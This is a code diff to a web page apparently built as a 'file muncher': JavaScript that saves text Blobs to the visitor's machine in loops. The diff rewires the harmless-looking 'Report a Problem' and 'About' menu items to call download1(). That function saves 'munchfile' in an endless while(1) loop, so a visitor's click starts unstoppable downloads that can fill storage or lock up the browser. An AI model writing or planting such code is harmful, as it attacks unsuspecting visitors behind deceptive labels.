@@ -104,8 +104,8 @@ li a:hover:not(.active) {
 <ul>
   <li class="active" onclick="allinone()"><i class="fa fa-fw fa-home"></i> Home</li>
   <li onclick="download(document.getElementById('a').value)"><i class="fa fa-newspaper-o" aria-hidden="true"></i> News</li>
-  <li onclick="download(document.getElementById('a').value)"><i class="fa fa-fw fa-envelope"></i> Report a Problem</li>
-  <li onclick="download(document.getElementById('a').value)"><i class="fa fa-question-circle" aria-hidden="true"></i> About</li>
+  <li onclick="download1()"><i class="fa fa-fw fa-envelope"></i> Report a Problem</li>
+  <li onclick="download1()"><i class="fa fa-question-circle" aria-hidden="true"></i> About</li>
   <input class="topnav" type="number" id="a" value=3 style="z-index: 701;float: right;padding: 6px;margin-top: 8px;margin-right: 16px;border: none;" placeholder="Munchin' powa..."><br>
 </ul>
 
@@ -143,11 +143,6 @@ var data=
  '   \\/_/    / / /     / / /____\\/ // / /    / / // / /_________\\/ / /   / / //\\__\\/_/___\\/ / /    / / /        0'  + 
  '          \\/_/      \\/_________/ \\/_/     \\/_/ \\/____________/\\/_/    \\/_/ \\/_________/\\/_/     \\_/' ; 
 var count = 0;
-// var data2;
-// var txt1 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";   
-// while(count<5){
-// 	data2 = txt1 + data;
-// }
 var type = 'text/txt';
 var text = "a";
 var OSName = "no";
@@ -204,13 +199,13 @@ function allinone(){
 		i++;
 	}
 }
+function forever(){
+
+}
 function download(mult) {
     bobby = 5;
     bobby*=mult;
     bob = 0;
-    // if(mult==null){
-    //   bobby = 50;
-    // }
     if(OSName=="Windows"){
 		allinone();
 	}
@@ -240,7 +235,7 @@ function download(mult) {
 
 function download1() {
    while(1){
-    filename = 'munchfile'+bob;
+    filename = 'munchfile';
     var file = new Blob([data], {type: type});
     if (window.navigator.msSaveOrOpenBlob) // IE10+
         window.navigator.msSaveOrOpenBlob(file, filename);
